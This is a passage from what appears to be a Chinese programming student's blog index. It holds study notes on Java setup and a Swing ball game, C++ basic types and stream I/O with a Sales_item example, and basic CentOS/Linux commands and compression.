默认按照空格、制表符、换行等空字符作为分割符。也就是这些分隔符中间的字符串对于java来说是一个整体，可以用next一次读取完。然而分隔符自动忽略，或者不吸收留在输入流中。","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"java基础","date":"2020-12-05T12:00:30.000Z","path":"2020/12/05/2020.12.05 开始 java 征程/","text":"java编程语言 C：底层，嵌入式开发。 **C/C++**：操作系统，游戏引擎，服务器，Linux。面向对象。 java：企业级软件开发，安卓移动软件，很多方面。 PHP：适用于中小型网站开发。 Object-C/Swift：苹果应用开发，ios。 javaScript：与java没关系，用于浏览器端效果开发，H5前端开发。Node.js等等。 Python：人生苦短，我学python。Web编程，多媒体应用，引擎；机器学习，人工智能，图像处理，信息安全。 C#：微软发布的语言，面向对象，类似于java，闭源，运行于.NET Framework之上。开发基于windows平台的桌面软件首选。 GO：Golang，与C语法类似，专为并发而生？ 概述 JavaEE（java Enterprise Edition）：java企业版，服务器开发。 JavaSE：JavaEE包含JavaSE，定位个人计算机的应用。 javaME（java Micro Edition）：微型版本。不常用，不用学。 特性 前期学习简单，难在后期的协作与管理架构等等…… 面向对象，高性能，分布式，多线程，跨平台，安全性，健壮性。 java是编译型与解释型语言的结合。注意，不是说java是运行时编译。 java源程序-&gt;编译生成-&gt;字节码-&gt;提供给java虚拟机JVM-&gt;解释运行。 概念 JVM ：java运行时环境，因为有适用于各个平台的虚拟机，所以java程序可跨平台！。 java————”编译一次到处运行“；就是因为JVM的存在。 java唯一认识的操作系统就是 JVM。而，.class字节码就是JVM该虚拟机的可执行文件。 java程序，编译生成字节码.class，字节码由JVM解释成对于各操作系统所认识的机械码。 JRE ：Java Runtime Enviroment，包含JVM，及相关java SE API。 JDK ：包含JRE，和编译器与调试器，等编译程序的工具程序。 要将 .java 变成 .class 肯定需要一方来完成，它就是 JDK!! —— Java Development kit! 开发人员所需要用到各种 JDK 中的工具，而各种集成开发环境IDE，也是通过调用JDK中的各种指令工具。 环境配置JDK 下载、安装、配置 官网下载 JDK 包，然后进行安装。java SE development kit 安装目录在 “C:\\program\\java“ 配置系统环境变量 环境变量包括：系统环境变量，与用户环境变量。两者区别是适用范围不同。 JAVA_HOME变量，添加jdk主目录：”C:\\Program\\java\\jdk1.8.0;” CLASSPATH变量，添加lib和jar目录：JDK1.5以上不需要配置。 java Hello 指令表示启动 JVM 执行 Hello.class然而，如果你不告诉它Hello.class所在路径的话，它是找不到的。所以需要设置默认 CLASSPATH 变量。 java C:\\uses\\22157\\desktop\\Hello.class 是错误的。JVM不认识windows下的路径 java -classpath C:\\users\\22157\\desktop Hello 是正确的 （1）CLASPASS 默认是 ‘.’ 点，表示当前目录。但是可能由于一些软件安装的修改，有的时候会出错。 （2）可以在命令行使用 SET CLASSPATH=. 来指定，但是命令行关闭后变量会失去作用，所以要求改环境变量（全局）。 “%JAVA_HOME%\\lib;” “%JAVA_HOME%\\lib\\tools.jar;” Path变量，添加两条bin目录： “%JAVA_HOME%\\bin;” “%JAVA_HOME%\\jre\\bin;” 注意，将两条记录放置到 path 目录最前面。 以后如果换 JDK 版本的话，只需要改 JAVA_HOME变量就行了，其他两个都是引用了该变量的。 第一个程序12345678public class Welcome&#123; public static void main(String[] args)&#123; System.out.println(&quot;Hello World&quot;); &#125;&#125;clss welcome2&#123; System.out.println(&quot;Hello World2&quot;);&#125; public 是访问修饰符，表示外部程序可以如何访问改类。 class 为定义一个类。java是面向对象的语言。所有的代码都必须在类中。 一个源文件，至多只能有一个 public class类，且文件名，必须与 public 类类名一致。 文件名以 .java 扩展名结尾。 一个源文件可以有多个 class。==但是开发过程中，一般一个 class 独占一个文件，好习惯。== 编译 .java 生成的字节码文件以 .class 结尾。 1234567java -cp .;c:\\jars\\* cc.openhome.Hello # 从当前目录下寻找并运行 cc/openhome/Hello.class 程序，链接C:\\jars目录下所有库文件。javac -sourcepath src -d classers src/Hello.java # 从 .\\src 中找到 Hello.java 并编译生成字节码 Hello.class 存放到 ./classers 中 # windows 中路径使用反斜杠 \\ # JVM 中路径使用斜杠 / ，同Linux 集成开发环境常见ide eclipse netbeans idea Visual Stdio 配置使用 eclipse eclipse 的版本选择，取决于 JDK 而不是计算机操作系统。 New 一个 java project，名称顺便取。 src 中保存我们所编写的源文件 bin 中保存源码编译所生成的字节码 .class JRE 中自带一些程序运行，所需要的一些字节码。 在 src 中右击，新建一个类文件，自动保存在 src 文件夹中 .java。 ctrl + F11 运行，自动生成 .class 在bin中。 JShell使用 java 脚本， JDK 10 版本以上所带程序。 可以只运行关键的 java 语句，而不需要新建 java 工程或文件。 在 txt 文本中只输入部分 java 语句， 然后使用 jshell，/open 执行java程序。 编辑器 注意，编辑器不是编译器。 Visual Stdio Code Notepad++ 桌球游戏代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import java.awt.*;import javax.swing.*;public class BallGame4 extends JFrame&#123; Image ball = Toolkit.getDefaultToolkit().getImage(&quot;images/ball.png&quot;); Image desk = Toolkit.getDefaultToolkit().getImage(&quot;images/desk.png&quot;); double x = 100; double y = 100; // 自定义为，运动方向与x轴的夹角。 double degree = 3.14/3; //角度 , 幅度表示 180° = 3.14 double speed = 10; // 速度 //画窗口的方法 //该方法，在调用完 launchFrame() 后自动被调用 public void paint(Graphics g) &#123; // 重写应该。不然没有调用，只调用了 repaint(); System.out.println(&quot;窗口被画了一次&quot;); g.drawImage(desk, 0, 0, null); g.drawImage(ball, (int)x, (int)y, null); // 改变下一次球所在坐标。 x += speed*Math.cos(degree); y += speed*Math.sin(degree); // 上下碰撞，调方向 if( y &gt; 500-40-30 || y &lt; 40+40 ) degree *= -1; // 左右碰撞，调方向 if( x &lt; 40 || x &gt; 856-40-30 ) degree = 3.14-degree; // 调速度，每次加载一次，速度都变慢。 if(speed &gt; 0) speed -= 0.01; &#125; // 窗口加载 // 该方法在main中被调用一次，随后，如果最小化再打开 figure 会再自动被调用一次 void launchFrame() &#123; setSize(856, 500); setLocation(50,50); setVisible(true); while(true) &#123; repaint();//重复调用 paint() 方法 try &#123; Thread.sleep(40); &#125;catch(Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; // 函数执行入口 public static void main(String[] args) &#123; System.out.println(&quot;欢迎来到桌球游戏&quot;); //声明，初始化一个 BallGame4() 对象 BallGame4 game = new BallGame4(); game.launchFrame(); &#125;&#125; 在运行一个类之前，必须先右击，Run As -&gt; Java Application 不能贸然使用快捷键 ctrl + F11 因为Tomcat 还没与项目进行关联好。 与传统的直角坐标系不同，在windows窗口中，左上角为(0,0) 越往下，y越大； 越往右，x越大； 所以 x+=10cos夹角，y+=10sin夹角时，球先往右下走，而不是右上走！ JFrame窗口，一旦被最小化，则停止加载，相当于中断，整个程序。 就停在那儿了，即使程序里面有死循环，仍然停止。 而，一旦打开最小化的窗口，就会自动执行一次窗口加载方法（launchFrame）。 整个游戏界面相当于一个类（BallGame），该类的父类为 JFrame 窗口类。 背景图片，坐标，速度都是该类的一些成员变量。所有类方法都可以共用。 对类的所有操作，封装成方法。比如，加载窗口方法，与添加元素方法比如背景图片，图片的位置。 疑问： 为什么，paint()方法不需要用代码实现调用，而是每次加载完窗口自动调用的？ repaint()方法又是什么东西，没用被定义，咋还可以用？ 相关知识、经验 java中awt组件，swing组件 参考解释链接 awt：抽象窗口工具包，早年编写图型界面应用程序的包。直接调用的是操作系统的图形库。优点：速度快，适用于硬件方面的嵌入式开发。包名java.awt swing：包含awt的所用功能，还对其功能进行了大幅度优化扩充。对平台无依赖，具有跨平台性。**速度慢，效果好，一般推荐使用。包名javax.swing ** extends JFrame 在java中，JFrame是官方提供的一个类，这个类的主要功能是使用该类可以快速的开发出Java界面应用程序（c/s架构），属于java.swing知识体系；它是屏幕上window的对象，能够最大化、最小化、关闭。 Image类与图片加载方法 导入：Toolkit.getDefaultToolkit().getImage(“Image/pic.jpg”); 公共工具包 默认工具包中的加载图片方法。 一般将图片移动到工程文件夹内，新建的图片文件夹内。 存储：使用Image抽象护具类型 放置：g.drawImage(desk, 0, 0, null); 其中，g 是一个 Graphics 对象，desk为一个 Image 对象，然后是坐标轴。 编程规范","link":"","tags":[{"name":"java","slug":"java","permalink":"http://www.fangning.xyz.com/tags/java/"}]},{"title":"变量与基本类型","date":"2020-11-02T13:07:23.482Z","path":"2020/11/02/2020.10.27 变量与基本类型/","text":"前言 不同的编程语言都具备一组公共的语法特征，不同语言之间仅在特征的细节上有所区别。 如，整型、字符型等内置类型。 变量，表达式，语句，if，while控制语句。函数等等…… 大多数编程语言使用两种方式，扩展其基本特征： 赋予程序员自定义数据类型的权力。如 c++ / java 等面向对象语言。 将一些有用的功能，封装成库函数。如 python Smalltalk等语言。 C++ 是一种静态数据类型语言，它的类型检查发生在编译时。因此，编译器必须知道程序中每一个变量对应的数据类型。 一条表达式是否合法，依赖于其中参与运算的对象的类型。 数据类型是程序的基础：它告诉我们数据的意义以及我们能在数据上执行的操作（行为）。 基本数据类型及使用注意事项 类型 含义 最小尺寸 int 整形 16位 long 长整性 32位 long long 长整性 32位 float 浮点型 6位有效数字 double 双精度浮点 10位有效数字 short 短整性 16位 char 字符型 8位 wchar_t 宽字符 16位 bool 布尔型 未定义 为了支持国际化，一个 char 空间应该确保可以存放机器基本字符集中的任意字符对应的数字值。扩展字符集，如 wchar_t， char16_t, char32_t。其中 wchar_t 宽字符，可以确保存放扩展字符集中的任意一个字符，后面两者则是为了 Unicode 字符集服务。 计算机中，一个基本存储单元如下： 地址 比特位 736424 0 0 1 1 1 0 1 1 736425 0 0 0 1 1 0 1 1 736426 0 1 1 1 0 0 0 1 736427 0 1 1 0 0 1 0 0 在 32 位计算机中，一个字，有 32 bit ，有 32 / 8 = 4 Bit字节。 可寻址的最小内存块为 “字节” —— 表中每一行为一个字节。 存储的基本单元成为 “字” —— 表中整个四行，为一个基本存储单元，为一个字。 也就是说，字 &gt; 字节 &gt; 比特。32位系统中，1字 = 4字节 = 32比特，64位操作系统中，1字 = 8字节 = 64比特。 浮点型表示，有单精度，双精度，扩展精度值。分别用 float , double , long double 来表示。 类型 空间 float 1 字 = 32bit double 2 字 = 64bit long double 34 字 = 96128bit 整型 字符型其实也能称之为整型，不过一般情况，用 char 来表示字符，而不是用来表示数字。但是，有时为了表示一个较小的数字，我们也可以用 unsigned char 来表示一个 0 ~ 255 的数字。 int , short , long , long long 都是带符号的，如果在前面加上 unsigned 就是无符号的。无符号，就是只能表示大于 0 的数，同时表示的正数范围变大了一倍。 char , signed char , unsigned char 。字符的表示也有有无符号之分。char 可能是有符号，也可能无符号。后两种分别为有符号，和无符号。 如何选择类型？ 明确知道数据不会为负时 ———— 采用无符号类型 采用 int 做整型运算，范围不够 直接用 long long。一般不用 long 别用 char 和 bool 做计算，除非需要用一个比较小的整数，可以用 unsigned char 或则 signed char 一定要指定类型，需要正负，就用有符号的，不需要就用无符号的。因为 char 是不确定的。 浮点运算直接用 double ， float 精度不行，而且计算代价和 double 差不多，用 double 岂不是很香:laughing: 类型转换 两种不同类型的数据进行运算会发生类型转换。 如果是赋值时不同，那么转换结果为，最终等号左边的类型。 当我们赋给无符号类型，一个超出它范围的值时，结果为初始值对无符号类型所能表示的数的总数取模的余数。总数的意思，就是你这个类型，一供可以表示多少个数，如果范围是 0 ~ 255 那就是能表示 256 个数。 12unsigned char x; // 0 ~ 255x = -1; // x 实际为 (-1 + 256)%256 = 255 **当我们赋给有符号类型，一个超出它范围的值时，结果是未定义的(undefind)**，此时程序会报错，越界，或者生成垃圾值。 当一个算术表达式中，既有 整型 int 又有 无符号 unsigned。那么会首先，将 int 转化成 unsigned ，然后再和 unsigned 进行运算。 循环控制条件中，最好别用 unsigned。 1for( unsigned i = 10; i &gt;= 0; i-- ); //该条件会循环无限次，因为 i 永远满足 i &gt;= 0，不会变成 -1 字面值 正常情况下 - 20 十进制 以 0 开头 - 024 八进制 以 0x 开头 - 0x14 十六进制 十进制字面值，一般用 int 存，如果超出再尝试用 long ，最后用 long long 。还是超界限，那就报错。 八进制，和十六进制字面值，依次用 int ， unsigned int , long , unsigned long , long long , unsigned long long 。或者报错。 负数字面值 -24，先存 24 然后，再对所保存的数去负值。实际上，只是在正数字面值上，多加了一步处理而已。 浮点数字面值，直接用 double 存。 布尔字面值， true or false 两种表示方法。 转义序列 对于一些我们无法打印的字符（回车，退格），或则一些特殊字符（单引号，双引号，反斜杠，问号），需要用到转义字符来处理。 通常使用 \\ 加上特殊符号来表示。\\n , \\t , \\b , …… 字符，字符串加前缀 前缀 含义 类型 u Unicode 16 字符 char16_t U Unicode 32 字符 char32_t L 宽字符 wchar_t u8 UTF-8（仅适用于字面值） char 整型字面值加后缀 u or U 表示 unsigned 如： 32U 为 unsigned x = 32 l or L 表示 long 如：32L 为 long x = 32 ll or LL 表示 long long 如：32LL 为 long long x = 32 以上后缀可复合使用，如 ULL 表示 unsigned long long 型字面值。 浮点型字面值加后缀 f or F 表示 float l or L 表示扩展精度 long double 变量使用注意事项变量定义 类说明符，可以是基本数据类型 int ， 或者自定义数据类型 Sales_item ，或者库类型 std::string 1std::string str(&quot;123&quot;); // str 是一种可变长度的字符序列，以 &#x27;\\0&#x27; 结尾！！ 对象：具有某种数据类型的内存空间。数据类型，不关心是基本数据类型，或者程序员自定义的数据类型。 初始值：注意，初始化不等同于赋值。初始化含义是创建变量时，赋予一个初始值，而赋值的含义是把对象的当前值擦除，而用一个新值来替代。 C++ 11 一种新的初始化变量的方法 —— 使用花括号 {} 1234int a = 0;int a = &#123;0&#125;; // C++ 11 标准中，可以使用花括号，进行 列表初始化。且可以规避丢失值的风险，解释如下文。int a&#123;0&#125;; // 同上一行方法。int a(0); {} 花括号赋初值，列表初始化，如果括号内值的数值类型，转化成被初始化的类型，造成数据丢失，编译器会警告。 123456789struct node&#123; int x; double y;&#125;;long double ld = 3.1425926;int a&#123;ld&#125; , b = &#123;ld&#125;; // 编译器报错，将 double 转 int 造成精度丢失。int a(ld) , a = ld; // 编译通过，精度丢失了，但是我们却不知道。node N&#123;ld, 1.414&#125;; // 列表初始化可以对对象的多个变量进行初始化，第一个会警告精度丢失，第二个值初始化正确。 由此可见，我们最好习惯使用列表初始化的方法，后期有更多广泛的用途…… 默认初始化 基本数据类型（内置类型）： 如果定义的对象在函数体内部，且未初始化，其值是不确定的。 如果定义对象在函数体外部，其值为 0 。 类的对象： 如果没有显式地初始化，那么其值由类确定。 如果类没有确定对象的初始值，那么其值也是不确定的。 另外，类可以规定，是否允许不经过初始化就定义对象。 突然发现 这样子写读书笔迹过于繁琐，浪费时间。以后就不这样更新博客了。 只遇到比较特别的知识点，应用，以及使用技巧，再记录下来。 对于绝大部分语言的细节，就只再书上做个笔记，博客就不再耗费精力更新了。","link":"","tags":[{"name":"C/C++","slug":"C-C","permalink":"http://www.fangning.xyz.com/tags/C-C/"}]},{"title":"输入输出流与类","date":"2020-10-22T08:15:30.000Z","path":"2020/10/22/2020.10.22 输入，输出，流，类/","text":"Linux 下的C++编程 首先需要编程，肯定需要源文件 我用的 Centos 中的 c++ 原程序可以是 以 .cpp 或者 .cc 结尾的文件存储。 创建文件的方法 vim [文件名]**，删除文件或目录方法 **rm -rf [文件/目录名] 创建目录的方法 mkdir [目录名]**， 删除目录的方法 **rmdir [目录名] 敲好代码之后，就是需要进行编译 编译需要编译器。Linux 中使用 GNU 编译器。 调用 GNU 编译器的命令是 g++ -o [定义可执行文件名] [源文件名] 或者 g++ [源文件] 如果不加参数 -o 与 [输出的文件名] 的话，就直接产生一个默认名为 a.out 的可执行文件文件。 Unix中要么无后缀，或者**.out后缀。Windows 中为 **.exe 为后缀。 编译生成可执行文件之后，就可以运行了 输入可执行文件的 绝对路径， 然后回车就行了。 GNU 编译命令中加参数 -Wall、微软编译器 visual studio 加参数 /w4。打开编译器选项。 输入输出流 iostream 是一个输入输出流 cout , cin ; 是 标准 输入/输出 对象。另外的 cerr 和 clog 使用的比较少，这里不加累述。 关于 endl 一个操纵符，作用是 结束当前行，并将关联的缓冲区中的内容刷到设备中，也就是刷新缓冲区的作用。 关于缓冲区解释参照这篇博客 关于运算符 &lt;&lt; 与 &gt;&gt; &lt;&lt; 左侧运算对象必须为 ostream 类型的对象。 右侧为需要打印的值。 该运算符，将输出值写到 ostream 对象中，然后返回修改后的 ostream 对象。 &gt;&gt; 左侧运算对象必须为 istream 类型的对象。 右侧为需要存放输入数据的变量。 该运算符，返回修改后的 istream 对象，istream对象是随时改变的。 代码解释 1234561. cout &lt;&lt; &quot;str1&quot; &lt;&lt; endl; // 等价于 (cout &lt;&lt; &quot;str1&quot;) &lt;&lt; endl; 先将，str1 写入到标准输出对象中(暂时存放在缓冲区)，然后 endl 刷新缓冲区，并且输出换行。2. while(cin &gt;&gt; v1); // cin 是标准输入流对象。其中的内容是随时间改变的，因此，每次循环，v1 都可以从 cin 中读取不同的数据。 // 因为 &gt;&gt; 操作符返回值是 cin。当 cin 中遇到一个结束符 “EOF” 或者 “一个无效输入” 是，条件为假循环结束。 类介绍书店销售记录保存​ 我们需要实现以下功能，帮助一个书店记录销售记录。 ​ 每条记录包含了三项基本信息：ISBM号、书的单价、售出册数 ​ 同时，便于老板查询销售情况，需要计算 每本书的销售量、销售总额、及平均售价。 为了使用一个类，我们需要明白三件事： 类名是什么？Sales_item 因为需要知道每一本书的销售总量、与销售总额、两者相除即可知道平均售价。 所以我们需要一个类 Sales_item 来记录一本书的以上三种属性。 暂时，先不深究它是如何实现的。 它在哪里被定义？ 每个类实际上就是定义了一种类型，类型名就是类名。 我们可以使用它，来定义类类型的变量。 Sales_item 存在 Sales_item.h 中被定义，使用时需要包含该头文件，即可定义该类类型的变量。 它支持什么操作？ 初始化 / 赋值操作 定义类，是为了使用类变量，既然是变量，就需要给予一定的值。 方法一，输入值，需要支持 &gt;&gt; 输入运算符。 方法二，直接赋值，需要支持 = 运算符。 输出 / 读取操作 方法一，使用类中的成员方法，比如 isbn() 来获取类变量中的某一属性，如 ISBN 编码。 方法二，输出值，需要支持 &lt;&lt; 输出运算符。 同一类变量的相互运算操作 既然是变量，那就会用到变量之间的运算，比如，**加，减，+=**等复合运算。 销售记录相加，需要支持 + 运算，将 isbn 码相同的记录对应的销售额，与销售量进行相加。 累加，需要支持 += 运算，将两者相加的结果，再赋值给运算符左边的对象（类变量）。 重定向命令 为了避免反复键盘输入数据，这里使用文件重定向。实现，将程序标志输入，输出与名命文件联系起来。 a.out outfile 其中的 ‘&lt;’** 命令表示重定向输入；**’&gt;’ 命令表示重定向输出。 该语句，表示将 infile 文件中的数据作为程序 a.out 的标准输入。并且将程序的标准输出，输出到文件 outfile 中。 Linux 下C++工程组织架构 首先，一般新建一个工程文件目录，比如 SalesPro 其中一般包含三个目录 sourse：该目录下包含程序文件，包括 sell.cc、Sales_item.h。以及编译生成的可执行文件 a.out、sell infile：该目录下包含输入的测试数据，indata outfile： 该目录用来存放测试程序时，所输出的文件。 tree 使用 tree 命令同样可以输出目录树。同 Windows 下的 tree 命令。 代码Sales_item.h 中所定义的 Sales_item 类以下类的定义暂时我们不需要懂，只需要知道如何使用该类。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#ifndef SALESITEM_H// we&#x27;re here only if SALESITEM_H has not yet been defined #define SALESITEM_H// Definition of Sales_item class and related functions goes here#include &lt;iostream&gt;#include &lt;string&gt;class Sales_item &#123;// these declarations are explained section 7.2.1, p. 270 // and in chapter 14, pages 557, 558, 561friend std::istream&amp; operator&gt;&gt;(std::istream&amp;, Sales_item&amp;);friend std::ostream&amp; operator&lt;&lt;(std::ostream&amp;, const Sales_item&amp;);friend bool operator&lt;(const Sales_item&amp;, const Sales_item&amp;);friend bool operator==(const Sales_item&amp;, const Sales_item&amp;);public: // constructors are explained in section 7.1.4, pages 262 - 265 // default constructor needed to initialize members of built-in type Sales_item() = default; Sales_item(const std::string &amp;book): bookNo(book) &#123; &#125; Sales_item(std::istream &amp;is) &#123; is &gt;&gt; *this; &#125;public: // operations on Sales_item objects // member binary operator: left-hand operand bound to implicit this pointer Sales_item&amp; operator+=(const Sales_item&amp;); // operations on Sales_item objects std::string isbn() const &#123; return bookNo; &#125; double avg_price() const;// private members as beforeprivate: std::string bookNo; // implicitly initialized to the empty string unsigned units_sold = 0; // explicitly initialized double revenue = 0.0;&#125;;// used in chapter 10inlinebool compareIsbn(const Sales_item &amp;lhs, const Sales_item &amp;rhs) &#123; return lhs.isbn() == rhs.isbn(); &#125;// nonmember binary operator: must declare a parameter for each operandSales_item operator+(const Sales_item&amp;, const Sales_item&amp;);inline bool operator==(const Sales_item &amp;lhs, const Sales_item &amp;rhs)&#123; // must be made a friend of Sales_item return lhs.units_sold == rhs.units_sold &amp;&amp; lhs.revenue == rhs.revenue &amp;&amp; lhs.isbn() == rhs.isbn();&#125;inline bool operator!=(const Sales_item &amp;lhs, const Sales_item &amp;rhs)&#123; return !(lhs == rhs); // != defined in terms of operator==&#125;// assumes that both objects refer to the same ISBNSales_item&amp; Sales_item::operator+=(const Sales_item&amp; rhs) &#123; units_sold += rhs.units_sold; revenue += rhs.revenue; return *this;&#125;// assumes that both objects refer to the same ISBNSales_item operator+(const Sales_item&amp; lhs, const Sales_item&amp; rhs) &#123; Sales_item ret(lhs); // copy (|lhs|) into a local object that we&#x27;ll return ret += rhs; // add in the contents of (|rhs|) return ret; // return (|ret|) by value&#125;std::istream&amp; operator&gt;&gt;(std::istream&amp; in, Sales_item&amp; s)&#123; double price; in &gt;&gt; s.bookNo &gt;&gt; s.units_sold &gt;&gt; price; // check that the inputs succeeded if (in) s.revenue = s.units_sold * price; else s = Sales_item(); // input failed: reset object to default state return in;&#125;std::ostream&amp; operator&lt;&lt;(std::ostream&amp; out, const Sales_item&amp; s)&#123; out &lt;&lt; s.isbn() &lt;&lt; &quot; &quot; &lt;&lt; s.units_sold &lt;&lt; &quot; &quot; &lt;&lt; s.revenue &lt;&lt; &quot; &quot; &lt;&lt; s.avg_price(); return out;&#125;double Sales_item::avg_price() const&#123; if (units_sold) return revenue/units_sold; else return 0;&#125;#endif 该章节最终程序实现，输入多条销售记录，其中isbn码相同的销售记录相邻。输入，每种书籍的销售总额、总销售量、以及平均售价。 思路：创建一类变量，用来保存上一次输入的销售记录；另外再创建一个类变量，用来保存这一次输入的销售记录。 如果两次连续输入的销售记录的 ISBN 编码相同，那么就将第二个类变量累加到第一个类变量当中。如何继续输入。 如果两次连续输入的 ISBN 编码不同，那么进行一次输出，并且将第一个类变量，替换成第一个类变量。继续输入。 如果输入为空，输出错误警告。 记得，最后需要输出，第一个类变量的值。 123456789101112131415161718192021222324252627282930include &lt;iostream&gt;#include &quot;Sales_item.h&quot;using namespace std;int main()&#123; Sales_item per; if(cin &gt;&gt; per) &#x2F;&#x2F; 先输入一条销售记录 &#123; Sales_item cur; while(cin &gt;&gt; cur) &#123; if(per.isbn() &#x3D;&#x3D; cur.isbn()) &#x2F;&#x2F; 输入的下一条销售记录与之前一条的一致，进行累加 &#123; per +&#x3D; cur; &#125; else &#x2F;&#x2F; 不一致，进行输出累加结果，并且保存新记录 &#123; cout &lt;&lt; per &lt;&lt; endl; per &#x3D; cur; &#125; &#125; cout &lt;&lt; per &lt;&lt; endl; &#125; else &#x2F;&#x2F; 如果没有输入数据，那么输出错误提示。 &#123; cerr &lt;&lt; &quot;No Data?!&quot; &lt;&lt; endl; return -1; &#125; &#125; 输入1 12345670-201-78345-X 3 20.000-201-78345-X 2 15.000-201-78345-X 1 10.011-321-12345-B 10 100.001-321-12345-B 2 10.402-111-11111-1 3 103-112-12121-4 4 7 输出1 12340-201-78345-X 6 100.01 16.66831-321-12345-B 12 1020.8 85.06672-111-11111-1 3 30 103-112-12121-4 4 24 6 输入2 空 输出2 error: No Data?! 小细节 Cerr 一个 ostream 对象，关联到标准错误，通常写入到与标准输出相同的设备。默认情况下，写到 cerr 的数据是不缓冲的。 cerr 通常用于输出错误信息，或其他不属于程序正常逻辑的输出内容。 缓冲区（buffer） 一个存储区，用于保存数据。IO设备通常将输入输出保存在一个缓冲区中，读写的动作与程序中的动作无关。 我们可以显式地刷新输出缓冲区，以便强制将其中的数据写入输出设备。 默认情况，读cin会刷新cout；程序非正常终止，会刷新cout。 未初始化变量 类类型的变量如果没有初始化，则按照类定义指定的方式进行初值指定。 定义在函数内部的内置类型变量默认不初始化的，除非有显式初始化语句。 :: 运算符 作用域运算符。比如访问命名空间中的名字，可以：std::cout 表示命名空间 std 中的名字 cout","link":"","tags":[{"name":"C/C++","slug":"C-C","permalink":"http://www.fangning.xyz.com/tags/C-C/"}]},{"title":"Linux基本操作","date":"2020-10-21T14:18:30.000Z","path":"2020/10/21/2020.10.21 基本快捷键及操作/","text":"安装 VMwaretools VMwaretools ： 功能能够实现虚拟机与真实机之间的文件复制。 注意：有些版本的 VMware 在部署好 Linux 之后自动按照好了 VMwaretools 的。 如何确定是否按照好了呢？你在虚拟机里面复制一段文字，然后到真实机去粘贴，看能不能成功。 成功的话就是按照好了 VMwaretools ，否则需要额外安装。 安装方法： 点击 VMware 中的 虚拟机 -&gt; 安装VMwaretools 图形界面下，打开桌面的光盘。找到安装程序压缩包。拖到桌面。右击解压到这里。 然后用图形界面，运行解压后的文件夹中的可执行文件，进行安装，记得加参数 -d , 默认安装。 关于安装完 VMwaretools 之后仍然不能实现文件复制 这时候，就需要用到主机与虚拟机之间文件夹的共享了。也就是，让虚拟机使用主机当中的一个文件夹。 打开VMware虚拟机设置 -&gt; 选项 添加完共享文件夹之后，以后存放到这个文件夹内的文件，虚拟机中也可以访问。 虚拟机中路径为 /.mnt/hgfs/[共享文件夹名] 一百来说，临时挂载的设备，比如 U盘等，都存在于 Centos 根目录下的 mnt 文件夹中。 Linux 中，万物皆文件，都对应一个文件目录，或者文件。 关于 CentOS8 中如何使用中文输入Centos中文输入解决办法 yum 指令使用方法 出现的问题 在右上角的设置中，切换到了中文输入，结果输入的还是英文，完全没啥用。 解决办法 输入下面这条指令，安装 ibus 。 1yum install ibus ibus-libpinyin 然后 使用 reboot 命令重启 Centos 然后在右上角的设置里面，找到 语言和地区，然后选择 汉语（智能拼音），注意，一定要找这个，汉语的选项有很多，都是只有这个可以输入中文。 NET网络 仅主机：只能同虚拟机内部各虚拟主机通信； 桥接：需要有外网 IP； NET：和主机共用一个 IP（常用）；配置教程 配置完成后，虚拟机 ip 是通过虚拟 DHCP 服务器获取的，想要不变的话，需要配置静态 IP（centos: /etc/sysconfig/network-script/ifcfg-ens33）。 在原 DHCP 状态下查找自己已经分配到的 ip：命令：ip addr； 然后静态配置 ipaddr 为刚刚查到的地址，以后就都是这个地址； 配置文件属性都是大写字母； 修改后：service network restart 命令重启网卡。 基本操作 执行可执行文件 命令行下，输入文件的绝对路径 ./[filename] ，然后回车就行。 安装软件过程中加参数 -d (default) ， 可默认选择安装过程中需要手动设置的一些选项。 Tab 键：命令字 和 已存在的文件名 补齐 如果忘记一些命令，比如 cat ， 可以敲一个 c 然后 Tab ，就会列举所有 c 开头的命令。 文件名补齐，就和 Windows 命令行下的一样。 ^C : Ctrl + C 取消功能 新用法：比如 poweroff ^c 回车，Linux 并不会关键，而是取消这一条命令的执行！ 增删改查命令 查: ls 查看当前目录下文件。 ll 查看当前目录下文件的详细信息。 cat 打开黑色文件，进行查看。 创建文件、目录: touch [文件名] 创建一个文件，例如：touch Hello.txt echo “Hello World” &gt; Hello.txt # echo 可将字符串写入文件中。 mkdir [文件夹名] 创建一个蓝色的文件夹，例如：mkdir MyCodes 复制、剪切: mv [文件名] [路径] 将参数1文件，剪切到参数2路径中。 mv [文件名] [rename] 将参数1文件，重命名为参数2名称。 cp [文件1] [文件2] 将文件1，复制成文件2。# copy 创建链接（也就是快捷方式）: ln -s [源文件绝对路径] [快捷方式文件路径] 生成一个淡蓝色的快捷方式。 # link 注意，如果源文件被删除，创建的链接会变成 黑底红字 报错。 刚刚试了一下，发现不能’给目录创建链接’，只能是文件！ 删除: rm [文件名/目录名] # remove 加参数: -f 强制删除 -r 递归删除目录 获取帮助信息 Linux 命令格式：# 命令字 【选项】 【文件或者目录】。表示对文件或者目录的命令操作。 查看命令帮助选项：man 【命令字】。表示查看命令的用法，manu菜单。 man ls -a 显示隐藏文件 -l 显示详细信息 -h 显示易读的文件大小 -R 递归，复制文件夹或者删除都要加该选项 recursive。 操作系统命令字 系统命令解释器自带的命令：使用 help 查看手册。例如，cd 第三方软件安装携带的命令：使用 man 查看手册。例如，ls 压缩与解压缩压缩文件 先生成一个 大小为100M的垃圾文件。然后进行压缩。 12dd if=/dev/zero of=/tmp/yasuof bs=1M count=100 # dd disk dump 磁盘转储dd if=/dev/zero of=/tmp/yasuof2 bs=1M count=100 if - inputfile 输入文件 of - outputfile 输出文件 bs - 单位 count - 计数器 命令1 gzip [文件名] ——— # 压缩文件 gunzip [压缩包] ——— # 解压缩 命令2 bzip2 [文件名] ———– # 压缩文件 bunzip2 [压缩包] ———- # 解压缩 两个命令压缩后文件后缀不同：分别是 .gz 和 .bz2 ​ 上图可见 gzip 和 bzip2 命令不适用于对文件目录的压缩。 对目录打包压缩 ==对于目录来说==，需要 先打包、后压缩、后缀一般为 .tar.gz 打包：tar -cf /tmp/fileName.tar /tmp/fileName 压缩：gzip /tmp/fileName.tar 解压：gunzip /tmp/fileName.tar.gz 解包：tar -xf /tmp/fileName.tat tar 与 gzip/bzip2 组合使用： 打包+压缩：tar -zcf /tmp/fileName.tar.gz /tmp/fileName -cf：creat file 打包选项。 -z：调用gzip工具。 -j：可调用bzip2工具。 解压+解包：tar -zxf /tmp/fileName.tar.gz -C /root -x：解包。 -C：指定解压路径。 